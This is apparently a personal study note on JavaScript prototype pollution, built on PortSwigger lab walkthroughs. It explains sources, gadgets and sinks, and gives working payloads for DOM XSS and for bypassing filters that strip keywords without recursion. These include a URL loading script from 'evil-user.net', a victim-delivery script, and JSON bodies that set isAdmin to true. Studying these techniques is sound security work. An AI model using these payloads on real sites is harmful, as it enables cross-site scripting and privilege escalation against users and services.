![[Prototype Pollution.webp]]
# Prototype Pollution

Prototype pollution is a JavaScript vulnerability enabling an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects. IT lets an attacker control properties of objects that would otherwise be inaccessible.

If an app handles an attacker-controlled property in an unsafe way, it can potentially be chained with other vulnerabilities. In client-side JavaScript, this can lead to DOM XSS, while server-side prototype pollution can even result in remote code execution.

An object is a collection of key:value pairs known as properties such as:

```javascript
const user =  {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
```

The properties can be accessed using dot notation or bracket notation:

```js
user.username     // "wiener"
user['userId']    // 01234
```

Properties can also contain executable functions:

```js
const user =  {
    username: "wiener",
    userId: 01234,
    exampleMethod: function(){
        // do something
    }
}
```

Above is an `object literal` - meaning it was created using curly brace syntax to explicitly declare its properties and their initial values. Almost everything in JavaScript is an object. 

Every object is linked to another object of some kind, known as its `prototype`. By default, JavaScript automatically assigns new objects one of its built-in prototypes. Strings are automatically assigned the built in `String.prototype`. Some examples include:

```js
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);	    // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```

Objects inherit all properties of their assigned prototype, unless they have their own property with the same key. Built-in prototypes provide useful properties and methods for basic data types. The `String.prototype` object has a `toLowerCase()` method. As a result, all strings automatically have a ready-to-use method for converting to lowercase.

Prototype polluion arises when a JavaScript function recursively merges an object containing user-controllable properties into an existing object with no sanitization allowing an attacker to inject a property with a key like `__proto__` along with arbitrary nested properties.

The merge may assign the nested properties to the object's prototype instead of the object itself. If so, an attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the app in a dangerous way.

>[!info]
>It is possible to pollute any prototype object, but it most commonly occurs with the built-in global `Object.prototype`.

To successful pollute a prototype, you need key components:

1. A prototype pollution source - any input that enables you to poison prototype objects with arbitrary properties.
2. A sink - a JavaScript function or DOM element that enables arbitrary code execution.
3. An exploitable gadget - any property passed into a sink without filtering or sanitization.
# Object Inheritance

When referencing a property, the JavaScript engine tries to access it directly on the object itself. If no object matches, the engine looks for it on the prototype instead. For example, you can reference `myObject.propertyA`:

![[existingObject.png]]
# Prototype Chain

An object prototype is another object, which should also have its own prototype and so on. The chain ultimately leads back to the top-level `Object.prototype`, whose prototype is `null`.

![[String Prototype.png]]

Objects inherit properties not just from immediate prototypes, but from all objects above them in the chain meaning username object has access to properties and methods of both `String.prototype` and `Object.prototype`.
# Accessing Object Prototypes

Every object has a property to access its prototype - `__proto__` is the de facto standard used by most browsers. If you are familiar with object-oriented languages, the property serves as a getter and setter for the object's prototype, meaning you can use it to read the prototype and its properties and even reassign them.

You can access `__proto__` using bracket or dot notation:

```js
username.__proto__
username['__proto__']
```

You can even chain references to `__proto__` to work up the chain:

```js
username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```

It is possible to modify JavaScript built-in prototypes. Modern JavaScript provides the `trim()` method for strings, which enables you to easily remove any leading or trailing whitespace. Before it was added, devs sometimes add custom implementations to the `String.prototype` object via:

```js
String.prototype.removeWhitespace = function(){
    // remove leading and trailing whitespace
}
```

All strings have access to this method:

```js
let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"
```
# Prototype Pollution Sources

A source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources include:

- URL via either the query or fragment string
- JSON-based input
- Web messages

For example, a URL can contain an attacker constructed query string:

```http
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

A URL parser may interpret `__proto__` as an arbitrary string when breaking down the query string into key value pairs. If these keys and values are subsequently merged into an existing object, you may think the `__proto__` property along with the nested value of `evilProperty` are added to the target object:

```js
{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}
```

At some point, the recursive merge operation may assign the value of `evilProperty` using a statement such as:

```js
targetObject.__proto__.evilProperty = 'payload';
```

The JavaScript engine treats `__proto__` as a getter for the prototype. As a result, `evilProperty` is assigned to the returned prototype object rather than the target object itself. Assuming the target object uses the default `Object.prototype`, all objects in JavaScript runtime will inherit `evilProperty`, unless a matching key already exists.

Injecting a property like this is unlikely to have an effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the app or any imported libraries.

User-controllable objects are also often derived from JSON strings using `JSON.parse()` method which also treats any key in the JSON object as an arbitrary string including things like `__proto__`. For example, an attacker can inject malicious JSON:

```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

If converted into JavaScript via `JSON.parse()`, the resulting object will have a property with the key `__proto__`:

```js
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```

If the object created via `JSON.parse()` is merged into an existing object without proper key sanitization, it can lead to prototype pollution during the assignment.
# Prototype Pollution Sinks

A sink is just a JavaScript function or DOM element that you can access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands.

Since prototype pollution lets you control properties that are otherwise inaccessible, it potentially enables you to reach a number of additional sinks within the target app. Devs who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable meaning there may only be minimal filtering or sanitization in place.
# Prototype Pollution Gadgets

A gadget provides a means of turning the pollution vulnerability into an exploit. It is any property that:

- Used by the app in an unsafe way, such as passing it to a sink without filtering
- Attacker-controllable via prototype pollution. The object must be able to inherit a malicious version of the property added to the prototype by an attacker.

>[!info]
>A property cannot be a gadget if it is defined directly on the object. In that case, the object's own version takes precedence over any malicious version. Robust sites may also set the prototype of the object to `null`, which ensures that it does not inherit any properties at all.

Many JavaScript libraries accept an object that devs can use to set different config options. The library checks whether the dev has added certain properties to the object and if so adjusts the config. If a property that represents a particular option is not present, a predefined default option is often used instead. 

A simple example:

```js
let transport_url = config.transport_url || defaults.transport_url;
```

The library code uses this `transport_url` to add a script reference to the page:

```js
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

IF the devs have not a transport_url property on the config object, it is a potential gadget. In cases where you can pollute the global `Object.prototype` with `transport_url` property, it will be inherited by the `config` object and therefore set as the `src` for this script to a different domain.

If the prototype can be polluted via a query, an attacker would simply induce a victim to visit a crafted URL to cause their browser to import a malicious JavaScript file from an attacker domain:

```html
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

By providing a `data:` URL, an attacker can directly embed XSS payloads within the query string:

```html
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```

>[!info]
>Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix.
# Recon

Finding pollution sources is trial and error. Try different ways of adding an arbitrary property to `Object.prototype` until you find a source that works. When testing for client-side vulnerabilities, it involves steps like:

1. Try injecting an arbitrary property via the query string, URL fragment, and any JSON input such as:

```js
vulnerable-website.com/?__proto__[foo]=bar
```

1. In a browser console, inspect `Object.prototype` to see if it successfully polluted with an arbitrary property

```js
Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful
```

If not added, try different techniques such as dot notation:

```js
vulnerable-website.com/?__proto__.foo=bar
```

DOM Invader can also be used to automatically test for prototype pollution sources by browsing.

Once a source is identified that lets you add arbitrary properties to the global `Object.prototype`, the next step is finding a gadget to craft an exploit. To do it manually:

1. Look at the source code and find any properties that are used by the app or any libraries that it imports.
2. In Burp, enable response interception and intercept the response containing the JavaScript to test.
3. Add a `debugger` statement at the start of the script, then forward any remaining requests and responses.
4. In Burp's browser, go to the page on which the target script is loaded. The `debugger` statement pauses execution of the script.
5. While script is paused, enter the following in the console replacing the property with one you think is a potential gadget

```js
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

The property is added to the global `Object.prototype` and the browser logs a stack trace to the console whenever access.

1. Continue execution and monitor the console. If a stack trace appears, it confirms the property was accessed somewhere within the app.
2. Expand the stack trace and use the provided link to jump to the line of code where the property is being read.
3. Using debugger controls, step through each phase of the execution to see if the property is passed to a sink, such as `innerHTML()` or `eval()`.
4. Repeat for any properties that are potential gadgets.

>[!info]
>DOM Invader can automatically scan for gadgets and can generate DOM XSS PoC in some cases.
# Cheat Sheet

As a quick reference for prototype pollution via the URL:

```bash
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

Or for prototype pollution via JSON input:

```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

```json
"constructor": {
    "prototype": {
        "evilProperty": "payload"
    }
}
```
# DOM XSS via Client-Side Prototype Pollution

For example, try defining an object in the console to first understand what prototype pollution is:

```js
let myObject = {name: 'example', id: 1}
```

To grab the name value, it can be done two ways:

```js
myObject.name
myObject['name']
```

![[myObject.png]]

The object has other properties besides the one declared as JavaScript automatically assigns new objects one of its built-in prototypes such as `String.prototype` or `Object.prototype`:

![[myObject Prototype.png]]

The object inherits all of the properties of the assigned prototype, except if it already contains a property with the same key. 

If you write `myObject.__proto__.isImportant = true` and call the object, the `isImportant` may be assigned to the prototype rather than the target object, meaning any object that uses the default `Object.prototype` will inherit the property unless one is already defined.

![[isimportant.png]]

>[!info]
>It happens because during assignment, JavaScript treats proto as a setter for the prototype.

Try polluting the object via the URL with an arbitrary property by a query string such as:

```js
?__proto__.evil=polluted
```

If polluted correctly, try calling the `Object.prototype` in the console and checking if it exists. If not, try the bracket notation instead:

```js
?__proto__.[evil]=polluted
```

![[EvilPolluted.png]]

If it exists in the prototype, it means the Object prototype is polluted, meaning a source has been found. Next, study every JS file and identify any properties used by the app via checking the `resources/js` folder in the Debugger tab for all JS files.

![[deparam.png]]

It converts URL parameters into a JavaScript object by replacing `+` with spaces, splits the query parameters into an array, iterates over each parameter and separate the key from the value, decodes the key and value using `decodeURIComponent`, handles nested parameters and the race syntax in the keys and more.

Another JS files may call the `deparam` function:

![[deparamcalled.png]]

To check what the code does, try running it on the console. IT creates a config object with a params property. The `params` property is an objected obtained by parsing the query parameters of the current URL and converts them into an object using the `deparam` function.

![[letparam.png]]

Try adding a variety of query parameters to the URL and check config again. The `evil` property is part of the object prototype properties. 

The `searchLogger` function uses a transport_url property of the config object to dynamically add a script inside the page. The config object has no transport URL property defined, meaning you can pollute the object prototype with the property. 

When the function checks if it exists, it creates a script element and passes the value of the property to the `src` attribute.

To exploit, pollute the prototype with a `transport_url` property equal to a random value:

```js
?__proto__[transport_url]=example
```

![[configurl.png]]

The config object has the transport_url which was inherited from the object prototype. The `script` was added to the DOM with the src attribute set to `example`. To call an alert, the data URL scheme can be used to include data directly in the URL:

```js
?__proto__[transport_url]=data:text/javascript,alert()
```

>[!info]
>When browsers encounter the script tag with a src attribute pointing to a data URL, it interprets the content as code rather than treating it as plain text.

Other payloads that work include ones without the MIME type specified:

```js
/?__proto__.transport_url=data:,alert(1);
/?__proto__[transport_url]=data:,alert(1);
```

To do it with DOM Invader, turn it on with prototype pollution enabled. It automatically checks the page for sources that enable you to add arbitrary properties to the object prototype. The results are stored in DevTools:

![[DOMInvader.png]]

It finds two potential sources for polluting the object. Hitting "Test", it opens a new tab and adds an arbitrary property to the object prototype:

```js
/?__proto__[testproperty]=DOM_INVADER_PP_POC
```

After running it, check if a new object inherits the test property by creating a new object:

```js
let myObject = {}
myObject
```

![[dominvaderpoc.png]]

To scan for gadgets, click "Scan for Gadgets" - it will open a new tab and perform tests, identifying the transport URL property:

![[transportURL.png]]

Check the stack trace to get sent to the JavaScript file where the sink was found. Try clicking the "Exploit" button to automatically generate a PoC exploit which may call an alert payload.

For other scenarios, the client-side code may have some extra protections that are flawed, such as removing key words but not doing it recursively. Some payloads to bypass this validation include:

```js
/?__pro__proto__to__[transport_url]=data:,alert(1);
/?__pro__proto__to__.transport_url=data:,alert(1);
/?constconstructorructor.[protoprototypetype][transport_url]=data:,alert(1);
/?constconstructorructor.protoprototypetype.transport_url=data:,alert(1);
```

Another scenario may be that the app is using the user input within an eval() function. To trigger an XSS vulnerability, it is required "break" out of the context (use hyphens):

```js
?__proto__.sequence=-alert(1)-
```
# DOM XSS via Alternative Prototype Pollution Vector

For example, the first place to look is the URL - try polluting the object prototype with an arbitrary property via a query string and check the object prototype:

```js
/?__proto__.evil=polluted
```

![[evilpolluted2.png]]

If it contains the property, a source has been found. Try studying the JavaScript files and identifying any properties used by the app. For example, there may be a file that defines a jQuery plugin (`parseParams`) that parses query parameters from URL and returns them as a JavaScript object or there may be a `searchLoggerAlternative` file such as:

![[evalisevil.png]]

The `eval()` function is being used to dynamically executed code based on the manager sequence value. Check if the property passed to the sink is an exploitable gadget. 

Two objects are being initialized on the window object:

- macros - an empty object
- manager - has two properties of `params` and `macro`
	- `params` stores the results of the URL query parameters using the `parseParams` function
	- `macro` method takes a property parameter and checks if the macros object contains a property with the given name. If so it returns the value of the property.

If `manager.sequence` does not exist, `a` takes the value of 1. The `manager.sequence` becomes `a + 1`. For example, try checking the properties of the manager object - it contains two properties:

![[macroparams.png]]

If no sequence property exists, it means `manager.sequence` should be 2 which it is.

The eval function checks if manager and manager.sequence exists. If they both do, it calls the `manager.macro()` method with the value of manager.sequence as an argument. Since sequence is not defined, try polluting the object prototype by adding a sequence parameter with a value of `alert`, meaning the macro method is called with an alert function as a parameter.

>[!info]
>Functions can take another function as a parameter. When macro is called, the alert function is called immediately which displays a popup box to the page.

Try submitting `manager.macro(alert())` in the Console and see if a popup appears. If so, pollute the object prototype:

```js
/?__proto__.sequence=alert()
```

Check if the manager object contains a property called sequence and check the value of `manager.sequence`:

![[alert1.png]]

The value is `alert()1` because of the code that adds a `1` after the value of `manager.sequence`.  When `manager.macro` of `manager.sequence` is called, it does not trigger an alert due to an error:

![[Error.png]]

If so, try adding a `-` at the end to make it valid. JavaScript expects a semicolon, comma or operator after the function call to be valid syntax.

>[!info]
>DOM Invader can also complete this lab much quicker.
# Prototype Pollution via Constructor

A common defence is stripping away any properties with the key `__proto__` from user-controlled objects but it is flawed since there are alternative ways to reference `Object.prototype` without it. 

Unless the prototype is set to null, every JS object has a `constructor` property which contains a reference to the constructor function that was used to create it. For example, create a new object using literal syntax or invoking the `ObjecT()` constructor:

```js
let myObjectLiteral = {};
let myObject = new Object();
```

Then, you can reference the `Object()` constructor via the built-in constructor property:

```js
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}
```

Each constructor function has a prototype property, which points to the prototype assigned to any objects that are created by the constructor. You can also access any object's prototype via:

```js
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```

Since `myObject.constructor.prototype` is equivalent to `myObject.__proto__`, it is an alternative vector.
# Flawed Key Sanitization

A way sites prevent it is by sanitizing property keys before merging into an existing object. A common mistake is failing to recursively sanitize the input string. For example:

```js
vulnerable-website.com/?__pro__proto__to__.gadget=payload
```

If the sanitization process just strips `__proto__` without repeating, it would result in the following:

```js
vulnerable-website.com/?__proto__.gadget=payload
```
# Client Side Prototype Pollution via Flawed Sanitization

For example, try opening the console and defining a new object and then declaring and grabbing its properties:

```js
let myObj = {}
myOject.x = 'y'
myObject['a'] = 'b'
myObj
```

![[myobj.png]]

Besides declared properties, it also gets assigned a built in prototype (`object.prototype`). Objects automatically inherit all properties of their prototype, unless they already have their own property with the same key.

As an example, try calling `hasOwnProperty` method such as:

```js
myObject.hasOwnPropert('x')
```

![[propx.png]]

It returns true as the x property is attributed to the object. 

There are many ways to pollute the object prototype. For example, try using the `__proto__` property such as:

```js
myObj.__proto__.first = 'first'
myObj['__proto__']['second'] = 'second'
```

Another way is via the constructor:

```js
myObj.constructor.prototype.third = 'third'
myObj['constructor']['prototype']['fourth'] = 'fourth'
```

Checking the prototype properties may show it contains the new properties declared:

![[1234.png]]

All new objects will inherit these properties - check by declaring a new object:

```js
let newObj = {}
newObj
```

![[newobj.png]]

To exploit it, analyse the JavaScript files. For example, there may be a `searchLogger` function that initializes a new object `config` with a property `params`. The value of `params` is obtained by serializing the search parameters of the current URL and passing them through the `deparam` function:

![[deparam2.png]]

The function may be in another file. For example, it may parse the URL query parameters into a JavaScript object, split the params string into an array of key value pairs at the `&` character. It then splits the current key value pairs at the = sign.

It also handles complexities in the key names, coerces values to their appropriate types and sanitizes the key via `sanitizeKey` function:

![[KeySanitize.png]]

Try adding query string parameters to the URL such as:

```js
/?a=b&c=d
```

And execute the JavaScript line in the console that defines the object:

```js
let config = {params: deparam(new URL(location).searchParams.toString())};
```

![[params.png]]

The query parameters are added to the params property successfully. There is also an `if` statement - if `config` has a property named `transport_url`, the script dynamically creates a script element and sets the `src` attribute to the value of the `transport_url` property. It then appends it to the body of the HTML document.

![[letscript.png]]

Since config does not have a transport_url property by default, try polluting the object prototype with the property and provide a value that causes an alert by adding a query parameter:

```js
/?a=b&c=d&__proto__.transport_url=testing
```

The property name may be stripped:

![[stripped.png]]

Check the JS files for any indication of stripping. For example, it may replace the words like constructor, proto and prototype with empty strings:

![[sanitization.png]]

If it does not do it recursively, nesting the word inside itself may bypass the restriction. For example:

```js
/?a=b&c=d&__pro__proto__to__.transport_url=testing
```

If it does not work, try other versions such as:

```js
/?a=b&c=d&__pro__proto__to__[transport_url]=testing
```

If bypassed, the script will be added to the page and the payload can be modified to execute an alert box. To find payloads, try look at the XSS cheat sheet to search for `script src`:

```js
/?a=b&c=d&__pro__proto__to__[transport_url]=data:text/javascript,alert()
```
# Prototype Pollution in External Libraries

Prototype pollution gadgets may occur in third-party libraries imported in. If so, it is recommended to use DOM Invader to identify sources and gadgets. It will be much quicker and ensure you won't miss vulnerabilities that may be tricky to notice.

DOM Invader checks the page for sources that allow you to add arbitrary properties to built-in prototypes. For example, it may identify potential techniques. If so, try testing the payload and check if it works via the Console:

![[DOM Invader PP PoC.png]]

Try creating a new object and checking if it inherits the test property:

```js
let myObject = {}
myObject.testproperty
```

![[Test Property.png]]

If it all works, try scanning for gadgets and check for any identified sinks and try checking the stack trace and the JavaScript file. Try exploiting it automatically and check it works. If so, try delivering it to the victim such as:

```html
<script>
location = "https://0a3700fa035c3df1818ac503001d0083.web-security-academy.net/#__proto__[hitCallback]=alert%281%29";
</script>
```

For manual methods, try adding properties via the URL by using a query string or a hash string:

```js
#__proto__.foo=bar
```

And try querying the object prototype:

```js
Object.prototype
```

If no success, try different syntax:

```js
#__proto__[foo]=bar
```

![[Source Identified.png]]

If successful, try finding a gadget - any property that is passed into a sink without proper sanitization by looking at the JavaScript files the app uses. Look through the files one by one. For example, there may be a function that is used to add properties to the "Ua" object:

![[Function VA.png]]

There may be various properties like anonymizeIp, currencyCode, title, etc... Try testing the properties one by one and check if they are passed to a sink such as eval() by intercepting responses in Burp, refreshing the page and intercepting the response loading the JavaScript file.

Try adding a debugger statement such as:

```html
<script>
debugger;
</script>
```

![[Script Debugger.png]]

This pauses execution. Try executing the following code in the console that defines a getter for the property on the Object.prototype. When the script tries to access the property on any object, the getter function is executed which logs a trace to the console and returns a string:

```js
Object.defineProperty(Object.prototype, 'hitCallback', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

If no stack trace appears, it means it was never accessed. Repeat the test for every property until the console returns an error. Check the stack trace and analyse the JavaScript lines such as:

![[Var Vc.png]]

The `tc` is set to `hitCallback`. The `a.get(tc)` now returns polluted meaning the setTimeout is being called with polluted as the first argument instead of a function. To fix it, change the getter to return a function instead of a string:

```js
Object.defineProperty(Object.prototype, 'hitCallback', {
    get() {
        console.trace();
        return alert();
    }
})
```
# Prototype Pollution in Browser APIs

The `Fetch` API provides a simple way for devs to trigger HTTP requests using JavaScript. The `fetch()` method accepts two arguments - URL to send the request to and an options object to control parts of the request like method, headers, body parameters.

An example is:

```js
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=carlos&email=carlos%40ginandjuice.shop'
})
```

The method and body properties are defined, with more left undefined. If an attacker can find a suitable source, they can pollute Object.prototype with a malicious headers property which may be inherited by the options object passed into `fetch()` and subsequently used to generate the request.

As an example, the code may be vulnerable to DOM XSS:

```js
fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
```

To exploit it, they could pollute Object.prototype with a header property containing a malicious `x-username` header as follows:

```js
`?__proto__[headers][x-username]=<img/src/onerror=alert(1)>`
```

The header may be used to set the value of the `x-username` property in the returned JSON. In the client-side code above, it is then assigned to the `username` variable, later passed into the `innerHTML` sink resulting in DOM XSS.

Devs may attempt to block potential gadgets using `Object.defineProperty()` method which allows you to set a non-configurable, non-writeable property directly on the affected object:

```js
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
```

The `Object.defineProperty()` method accepts an options object known as a descriptor. Devs can use the descriptor object to set an initial value for the property being defined. If the only reason they are defining the property is to protect against prototype pollution, they may not set a value at all.

If so, an attacker can bypass it by polluting `Object.prototype` with a malicious `value` property. If inherited by the descriptor objected passed to `Object.defineProperty`, the attacker value is assigned to the gadget property.

For a full example, try polluting using a URL query parameter:

```js
/?__proto__.foo=bar
```

And query the object prototype:

```js
Object.prototype
```

If no success, try different syntax:

```js
/?__proto__[foo]=bar
```

![[FooBar2.png]]

If found, identify every property used by the app by analysing JavaScript files. There may be a transport URL or other property with a defined value of "false".

![[Transport URL False.png]]

If the object prototype is polluted with a transport_url property, the config object will not inherit it as it already has its own property with the same name:

![[Config False.png]]

The `object.DefineProperty` method may be in use that makes the transport_url property on the config object unwriteable and unconfigurable. It defines a new property on an object or modifies an existing property.

It takes three parameters:

1. Object on which to define the property
2. Property to be defined or modified
3. Descriptor object for the property

A `data` descriptor has an optional key name `value`. If defined, the value of the defined property will be changed to the new value. For example, a property may be defined as false - try adding the value property to the descriptor object and set it to true:

```js
let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
Object.defineProperty(config, 'transport_url', {value: true, configurable: false, writable: false});
```

![[Let Config.png]]

It changes to true meaning you can pollute the object prototype with a value property and override the value of `transport_url`. When `object.property` is called, the `descriptor` object, not having a value property defined, inherits the value property from the object prototype, overwriting the value of `transport_url`.

![[Transport URL.png]]

Try injecting an arbitrary value:

```js
/?__proto__[value]=polluted
```

If `config` has a property named transport_url, a script element is created and its source attribute is set to the value of the `transport_url` property - i.e. polluted - and appended to the body of the HTML document. Try injecting a payload inside script src such as:

```js
/?__proto__[value]=data:text/javascript,alert()
```
# Server-Side Prototype Pollution

An easy trap devs fall into is overlooking the fact a JavaScript `for..in` loop iterates over all of an object's enumerable properties, including ones inherited via the prototype chain, not including built-in properties set by JavaScript's native constructors since they are non-enumerable.

For example, try testing:

```js
const myObject = { a: 1, b: 2 };

// pollute the prototype with an arbitrary property
Object.prototype.foo = 'bar';

// confirm myObject doesn't have its own foo property
myObject.hasOwnProperty('foo'); // false

// list names of properties of myObject
for(const propertyKey in myObject){
    console.log(propertyKey);
}

// Output: a, b, foo
```

It also applies to arrays where a for loop first iterates over each index, which is just a numeric property key, before moving on to any inherited properties:

```js
const myArray = ['a','b'];
Object.prototype.foo = 'bar';

for(const arrayKey in myArray){
    console.log(arrayKey);
}

// Output: 0, 1, foo
```

If an app includes the returned properties in a response, it can provide a simple way to probe for server-side prototype pollution. 

POST or PUT requests submitting JSON data to an app or API are prime candidates for this as it is common for servers to respond with a JSON representation of the new or updated object. You can attempt to pollute the global `Object.prototype` with an arbitrary property:

```js
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```

If vulnerable, the injected property appears in the updated object:

```js
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```

A site may use properties to dynamically generate HTML, resulting in the injected property being rendered in your browser. Once identified that server-side prototype pollution exists, look for potential gadgets to use for an exploit.

>[!info]
>Any feature involving updating user data is worth looking at since they often merging incoming data into an existing object. If you can add properties, it can lead to privilege escalation.

For example, a request may be made that responds with JSON data such as:

```json
{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false}
```

Try adding an additional property when sending the request:

```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"lNfZLo3RtFk1owo6emrjXqC0pYm8voYR",
"foo":"bar"}
```

Check if the property is reflected. If so, try looking for any interesting properties such as `isAdmin`. If so, try adding it to the sent request and changing the value to `true`. There may be additional security measures in place. 

Try using prototype pollution by adding a new property such as:

```js
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"lNfZLo3RtFk1owo6emrjXqC0pYm8voYR",
"foo":"bar",
"__proto__": {
"polluted": true}}
```

If the `polluted` property is returned but no `__proto__` property, it may suggest a successful pollution of the object prototype and the polluted property is inherited by the chain:

![[Proto Chain.png]]

>[!info]
>The `foo` property is also still present, indicating a merging of data being sent into an existing object that represents the user.

Try changing the `isAdmin` to true by polluting the prototype:

```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"lNfZLo3RtFk1owo6emrjXqC0pYm8voYR",
"foo":"bar",
"__proto__": {
"isAdmin": true}}
```

![[isAdmin True.png]]

This suggest the user object doesn't have its own isAdmin property, but rather inherits it from the polluted prototype. 

It works because the browser is sending user information as a JSON string which is parsed on the server using `JSON.parse`. The proto property injected is likely treated as a normal property of the object meaning the object will pollute the object prototype if used with a vulnerable merge operation such as `assign()`:

```js
let myData = JSON.parse('{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"lNfZLo3RtFk1owo6emrjXqC0pYm8voYR",
"foo":"bar",
"__proto__": {
"isAdmin": true}}')

myData

let userData = Object.assign({}, myData)
userData
```

If the server checks something like:

```js
if(userData.isAdmin){console.log('Load admin panel')}
```

The userData will have the isAdmin property inherited from the polluted object prototype:

![[Load Admin.png]]
# Server-Side Prototype Pollution without Reflection

Most of the time, you will not see the affected property reflected. One approach is trying to inject properties that match potential config options and then compare the server's behaviour before and after the injection to see if the configuration change appears to have an effect.

>[!info]
>If it does, it is a strong indication of a vulnerability.

There are 3 main techniques:

- Status code override
- JSON spaces override
- Charset override
## Status Code Overrides

Frameworks like Express allow devs to set custom HTTP response codes. In case of errors, a server may issue a generic HTTP response, but include an error object in JSON format. It may even be common to receive a 200 OK response, only for the response body to contain an error object with a different status:

```http
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

Node `http-error` module contains a function to generate this response:

```js
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
```

The 5th line assigns the status variable by reading the `status` or `statusCode` property from the object passed into the function. If the devs have not set a property for the error, it can be used to probe for prototype pollution:

1. Find a way to trigger an error response and take note of the default status code.
2. Try polluting the prototype with your own status property - use an obscure status code that is unlikely to be issued for other reasons.
3. Trigger the error response again and check for overrides.

>[!danger] NodeJS
>You must choose a status code in the `400`-`599` range. Otherwise, Node defaults to a `500` status regardless, as you can see from the second highlighted line, so you won't know whether you've polluted the prototype or not.
>
## JSON Spaces Override

Express provides a `json spaces` option allowing the configuration of the number of spaces used to indent any JSON data in response. Devs leave this property undefined as they are happy with the default, making it vulnerable via the prototype chain.

If there is access to a JSON response, try polluting the prototype with your own `json spaces` property and reissue the relevant request to see if the indentation in the JSON increases accordingly and perform the same steps to remove the indentation in order to confirm.

This technique does not rely on a specific property being reflected and is safe since you are able to turn the pollution on and off by resetting the property to the same value as the default.

>[!danger] Express Upgrade
>Although it was fixed in Express 4.17.4, many sites have not upgraded.
## Charset Override

Express often implements `middleware` modules that enable preprocessing of requests before being passed to the handler function. The `body-parser` module is commonly used to parse the body of incoming requests in order to generate a `req.body` object - this contains another gadget that can be used to probe.

The following code passes an options object into the `read()` function which reads the request body for parsing. One option - `encoding` - determines which character encoding to use which is either derived from the request itself via the `getCharset(req)` function call or it defaults to UTF-8:

```js
var charset = getCharset(req) or 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
```

The devs may anticipate the `Content-Type` header may not contain an explicit `charset` attribute, meaning there is some logic that reverts to an empty string which could mean it is vulnerable.

If there is an object with properties visible in a response, use it to prove for sources. For example, add an arbitrary UTF-7 encoded string to a property reflected in the response:

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
```

Servers won't use UTF-7 encoding by default, so it should appear in the response in encoded form. Try polluting the prototype with a `content-type` property that specifies the UTF-7 character set:

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```

Repeat the first request and see if the string now gets decoded:

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
```

